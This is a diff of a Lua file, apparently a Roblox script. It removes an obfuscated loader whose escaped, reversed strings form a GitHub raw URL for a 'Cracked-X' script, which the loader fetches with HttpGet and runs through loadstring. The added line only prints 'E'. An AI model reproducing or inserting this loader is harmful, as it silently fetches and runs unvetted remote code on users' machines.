@@ -1,3 +1,1 @@
-local C,R,A,C_,K,E,D,X,_ = string.char,string.reverse,table.insert,table.concat,"\110\105\97\77\47\110\105\97\109\47\88\45\100\101\107\99\97\114\67\47\49\50\82\49\88\76\79\76","\47\109\111\99\46\116\110\101\116\110\111\99\114\101\115\117\98\117\104\116\105\103\46\119\97\114\47\47\58\115\112\116\116\104",string.gsub,loadstring,game
-
-function e(cc) local m={} for i=1,5 do A(m,"pkfhay")end;local z=C_(m)loadstring=nil;return X(_:HttpGet(R(E)..R(K)))()end;e()repeat wait(9e9) continue until game wait()
+print("E")
